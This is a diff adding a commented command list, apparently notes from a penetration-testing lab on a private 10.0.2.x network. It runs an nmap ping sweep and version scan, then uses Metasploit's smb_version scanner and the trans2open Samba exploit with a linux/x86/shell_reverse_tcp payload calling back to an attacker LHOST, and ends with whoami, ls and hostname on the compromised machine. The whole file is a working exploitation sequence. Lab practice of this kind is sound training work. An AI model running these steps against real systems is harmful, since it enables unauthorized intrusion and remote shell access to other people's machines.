@@ -1,1 +1,20 @@
+ip a  # Check your own IP address and network interfaces
+sudo nmap -sn 10.0.2.0/24  # Ping sweep to discover live hosts on the network
+nmap -sV 10.0.2.3  # Basic service scan with version detection
+msfconsole  # Launch Metasploit Framework
+search smb_version  # Search for SMB version detection module
+use auxiliary/scanner/smb/smb_version  # Use the SMB version scanner
+set RHOSTS 10.0.2.3  # Set target IP address
+run  # Execute the version detection
+search trans2open  # Search for trans2open exploit modules
+use exploit/linux/samba/trans2open  # Select the trans2open exploit
+show options  # View required and optional parameters
+set RHOSTS 10.0.2.3  # Set target IP address
+set LHOST 10.0.2.15  # Set local (attacker) IP address for reverse connection
+set payload linux/x86/shell_reverse_tcp  # Select reverse shell payload
+run  # Execute the exploit
+whoami  # Check current user
+ls   # List directory contents
+hostname # Check system hostname
+
 
